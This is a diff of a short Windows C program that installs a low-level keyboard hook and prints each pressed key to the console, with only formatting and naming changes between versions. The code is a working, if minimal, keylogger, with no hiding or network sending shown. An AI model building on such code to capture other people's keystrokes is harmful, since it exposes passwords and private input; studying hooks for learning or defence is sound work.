@@ -1,43 +1,42 @@
 #include <stdio.h>
-#include <windows.h>
+#include <Windows.h>
 
 LRESULT CALLBACK hook_proc(
     int code,
     WPARAM wParam,
     LPARAM lParam
-)
-{
-    if(code >= 0)
-    {
+){
+    
+    if (code >= 0){
         if (wParam == WM_KEYDOWN){
+
             KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
-            BYTE keyboardState[256];
-            GetKeyboardState(keyboardState);
+            BYTE KeyboardState[256];
+            GetKeyboardState(KeyboardState);
 
             WCHAR buffer[5];
 
             int res = ToUnicode(
-                kb->vkCode,
+                kb ->vkCode,
                 kb->scanCode,
-                keyboardState,
+                KeyboardState,
                 buffer,
-                4,
+                4, 
                 0
             );
 
-            if(res > 0){
+
+            if (res > 0){
                 printf("%lc \n", buffer[0]);
             }
         }
-
     }
 
     return CallNextHookEx(NULL, code, wParam, lParam);
 }
 
 
-int main()
-{
+int main(){
     HHOOK hook;
 
     hook = SetWindowsHookExA(
@@ -47,21 +46,22 @@ int main()
         0
     );
 
-    if(hook == NULL)
-    {
-        printf("Failed to install hook\n");
+
+    if (hook == NULL){
+        printf("\nFailed to install hook");
         return 1;
     }
 
     MSG msg;
 
-    while(GetMessage(&msg, NULL, 0, 0))
-    {
+    while (GetMessage(&msg, NULL, 0,0)){
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
 
     UnhookWindowsHookEx(hook);
 
+
     return 0;
 }
+
